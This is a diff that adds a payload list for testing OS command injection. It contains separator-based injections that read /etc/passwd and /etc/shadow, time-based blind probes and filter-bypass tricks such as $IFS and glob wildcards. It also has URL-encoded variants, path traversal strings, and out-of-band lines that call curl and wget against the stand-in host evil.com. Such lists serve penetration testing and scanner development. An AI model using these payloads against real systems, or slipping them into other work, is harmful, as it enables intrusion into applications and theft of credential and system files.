@@ -1,0 +1,154 @@
+# Command Injection Payloads
+# For testing OS command injection vulnerabilities
+
+# ===== Basic Command Injection =====
+; ls
+; ls -la
+; id
+; whoami
+; cat /etc/passwd
+| ls
+| id
+| whoami
+|| ls
+|| id
+& ls
+& id
+&& ls
+&& id
+`ls`
+`id`
+`whoami`
+$(ls)
+$(id)
+$(whoami)
+
+# ===== Unix/Linux Specific =====
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/hosts
+; uname -a
+; pwd
+; env
+; printenv
+; ps aux
+; netstat -an
+; ifconfig
+; ip addr
+| cat /etc/passwd
+| uname -a
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+|| sleep 5
+`sleep 5`
+$(sleep 5)
+
+# ===== Windows Specific =====
+& dir
+| dir
+; dir
+&& dir
+|| dir
+& type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\win.ini
+& whoami
+| whoami
+& hostname
+& ipconfig
+| ipconfig /all
+& net user
+| net user
+& systeminfo
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& timeout 5
+| timeout 5
+
+# ===== Time-Based Blind =====
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+|| sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+& ping -n 5 127.0.0.1
+; sleep 5 #
+| sleep 5 #
+& timeout /t 5
+| timeout /t 5
+'; sleep 5; '
+"; sleep 5; "
+`sleep 5`
+
+# ===== Out-of-Band (OOB) =====
+; curl http://evil.com/
+; wget http://evil.com/
+; nslookup evil.com
+; dig evil.com
+| curl http://evil.com/
+| wget http://evil.com/
+`curl http://evil.com/`
+$(curl http://evil.com/)
+; ping -c 1 evil.com
+
+# ===== Bypass Techniques =====
+;ls
+;id
+|ls
+|id
+;$()
+|$()
+`$`
+$(;)
+;{ls,}
+|{ls,}
+;l\s
+;l''s
+;l""s
+;l${IFS}s
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat</etc/passwd
+X|ls
+X;ls
+X`ls`
+X$(ls)
+
+# ===== Newline Injection =====
+%0als
+%0aid
+%0a/bin/cat /etc/passwd
+\nls
+\nid
+\n/bin/cat /etc/passwd
+
+# ===== Encoded Payloads =====
+%3Bls
+%3Bid
+%7Cls
+%7Cid
+%26ls
+%26id
+%26%26ls
+%60ls%60
+%24%28ls%29
+
+# ===== Filter Bypass =====
+l's'
+l ## inline comment
+"l"s
+l\s
+/???/??t /???/p??s??
+/???/b??/w?o??i
+
+# ===== Path Traversal + Command =====
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+....//....//....//....//etc/passwd
+..;/..;/..;/..;/etc/passwd
